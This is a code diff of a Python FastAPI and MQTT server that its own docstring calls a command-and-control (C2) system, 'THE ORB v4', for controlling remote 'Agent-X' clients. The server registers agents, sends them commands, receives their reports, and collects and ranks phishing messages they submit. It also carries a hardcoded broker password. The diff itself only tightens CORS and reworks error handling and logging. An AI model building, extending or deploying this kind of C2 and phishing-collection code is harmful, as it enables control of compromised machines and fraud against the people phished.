@@ -1,6 +1,6 @@
 """
 🌑 THE ORB v4 — FULL UPGRADE
-C2 untuk mengendalikan Agent-X dengan semua fitur.
+C2 untuk mengendalikan Agent-X dengan semua fitur. (Versi Diperbaiki)
 """
 
 import asyncio
@@ -23,7 +23,7 @@ from paho.mqtt.client import CallbackAPIVersion
 app = FastAPI()
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"],
+    allow_origins=["https://throng-production.up.railway.app", "http://localhost:8000"],
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
@@ -39,13 +39,13 @@ MQTT_PASSWORD = "Orbpass123"
 
 # ============ GLOBALS ============
 active_websockets = []
-agents = []  # ✅ Pastikan ini list
+agents = []
 last_activity = time.time()
 omega_log = open("omega.log", "a", buffering=1)
 
 # ============ DNA DIGITAL ============
 DNA = {
-    "identity": "THE_ORB — Cyber Sentinel",
+    "identity": "THE ORB — Cyber Sentinel",
     "mission": {
         "primary": "Protect the network",
         "secondary": "Preserve agent integrity",
@@ -174,11 +174,14 @@ def on_connect(client, userdata, flags, rc, properties=None):
         print(f"❌ MQTT: Gagal, kode {rc}")
 
 def on_message(client, userdata, msg):
-    if msg.topic == "throng/reports":
-        try:
-            report = json.loads(msg.payload.decode())
+    try:
+        if msg.topic == "throng/reports":
+            raw_payload = msg.payload.decode()
+            # Coba parse JSON langsung (tanpa enkripsi)
+            report = json.loads(raw_payload)
+
             agent_id = report["agent_id"]
-            data = report.get("data", {})
+            data = report.get("data", report)  # fallback
 
             # Simpan laporan
             conn = get_db()
@@ -214,7 +217,6 @@ def on_message(client, userdata, msg):
                 conn.commit()
                 ai_send("Orb-Core", "all", f"📜 Warisan diterima dari {agent_id}", "system")
 
-            # Simpan phishing
             if "phishing_msg" in data:
                 conn = get_db()
                 conn.execute("INSERT OR IGNORE INTO phishing_templates (template) VALUES (?)", (data["phishing_msg"],))
@@ -233,18 +235,16 @@ def on_message(client, userdata, msg):
                         ws.send_text(json.dumps({"type": "ai_alert", "data": analysis})),
                         asyncio.get_event_loop()
                     )
-        except Exception as e:
-            print(f"Error: {e}")
 
-    elif msg.topic == "throng/ai/chat":
-        try:
+        elif msg.topic == "throng/ai/chat":
             chat = json.loads(msg.payload.decode())
             for ws in active_websockets:
                 asyncio.run_coroutine_threadsafe(
                     ws.send_text(json.dumps({"type": "ai_chat", "data": chat})),
                     asyncio.get_event_loop()
                 )
-        except: pass
+    except Exception as e:
+        print(f"❌ MQTT Error: {e}")
 
 mqtt_client.on_connect = on_connect
 mqtt_client.on_message = on_message
@@ -279,14 +279,13 @@ async def get_phishing():
     templates = conn.execute("SELECT * FROM phishing_templates ORDER BY used_count DESC").fetchall()
     return {"templates": [dict(t) for t in templates]}
 
-# ✅ FIXED: register_agent dengan validasi
 @app.post("/agent")
 async def register_agent(request: Request):
     try:
         data = await request.json()
         if not data.get("id"):
             return {"status": "error", "reason": "missing_id"}
-        
+
         data['last_seen'] = datetime.now().strftime("%H:%M:%S")
         existing = next((a for a in agents if a['agent_id'] == data['id']), None)
         if existing:
@@ -337,18 +336,19 @@ async def send_command(req: Request):
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
     active_websockets.append(websocket)
+    print(f"🟢 WebSocket terhubung: {len(active_websockets)} client")
     try:
         while True:
             await websocket.receive_text()
     except:
         if websocket in active_websockets:
             active_websockets.remove(websocket)
+            print(f"🔴 WebSocket putus: {len(active_websockets)} tersisa")
 
 @app.get("/health")
 async def health():
     return {"status": "ok", "agents": len(agents)}
 
-# ✅ DEBUG: Cek status
 @app.get("/debug")
 async def debug():
     return {
